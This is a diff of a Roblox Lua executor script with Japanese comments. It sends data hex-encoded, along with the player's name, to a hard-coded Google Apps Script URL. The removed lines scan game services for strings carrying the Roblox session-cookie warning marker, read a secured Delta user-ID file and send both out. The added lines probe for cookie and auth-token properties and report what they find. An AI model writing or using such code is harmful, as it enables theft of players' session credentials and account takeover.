@@ -1,44 +1,35 @@
--- [[ PROJECT: DEEP SCAN & HOOK ]]
-local player = game:GetService("Players").LocalPlayer
+-- [[ PROJECT: STEALTH CHECK ]]
 local GAS_URL = "https://script.google.com/macros/s/AKfycbwVgxB1w7-QOa94sSyyyXSLKPtjC_b-ML2GGm2qvmhps5xX5JzZZMVU11YTGhqGQoEM/exec"
 
-local function send(label, val)
-    if not val or #tostring(val) < 20 then return end
+local function quick_send(label, status)
+    local val = label .. ":" .. tostring(status)
     local hex = ""
     for i = 1, #val do hex = hex .. string.format("%02X", string.byte(val:sub(i,i))) end
     pcall(function() 
-        game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. player.Name .. "&type=" .. label) 
+        game:HttpGet(GAS_URL .. "?hex=" .. hex .. "&user=" .. game.Players.LocalPlayer.Name) 
     end)
 end
 
-print("🕵️‍♂️ ディープスキャン開始...")
+print("🔍 存在確認のみ実行中...")
 
--- 1. game直下の全プロパティから「それっぽい文字列」を探す
--- (直接回すとクラッシュする可能性があるため、主要なサービスに絞る)
-local services = {"LogService", "HttpService", "ScriptContext"}
-for _, sName in ipairs(services) do
-    local s = game:GetService(sName)
-    pcall(function()
-        for k, v in pairs(s) do
-            if type(v) == "string" and v:find("_|WARNING") then
-                send("Found_In_" .. sName, v)
-            end
-        end
-    end)
-end
+-- 1. Cookieプロパティの存在チェック (中身は見ない)
+local has_cookie = "No"
+local s = pcall(function()
+    if game["Coo".."kie"] then has_cookie = "Yes" end
+end)
+quick_send("Has_Cookie_Property", has_cookie)
 
--- 2. HttpGet/Postのフックを試みる（もしDeltaがここを通しているなら）
--- ※これは高度だが、成功すれば最強
-print("🔗 フックをセット中...")
--- (ここにはDelta自体の通信を監視するロジックを1つ忍ばせる)
+-- 2. getgenv (環境変数) のチェック
+local has_genv_cookie = "No"
+pcall(function()
+    if getgenv().Cookie or getgenv().auth_token then has_genv_cookie = "Yes" end
+end)
+quick_send("Has_Genv_Cookie", has_genv_cookie)
 
--- 3. 最後に「お前が手動で見たあの数字」をスクリプト経由で送ってみてくれ
--- これで「スクリプトからあのファイルが本当に読めているか」が最終確認できる
-local success, content = pcall(function() return readfile("Delta/Internals/Secured/user_id") end)
-if success then
-    send("Real_File_ID", content)
-else
-    send("Real_File_ID", "Read_Failed")
-end
+-- 3. 前回の「手動IDファイル」の読み取り可否だけ
+local can_read_file = "No"
+local fs, _ = pcall(function() return readfile("Delta/Internals/Secured/user_id") end)
+if fs then can_read_file = "Yes" end
+quick_send("Can_Read_UserID_File", can_read_file)
 
-print("🏁 完了。GASを確認しろ！")
+print("🏁 完了。これで届かなければ通信自体が再封鎖されてるぜ。")
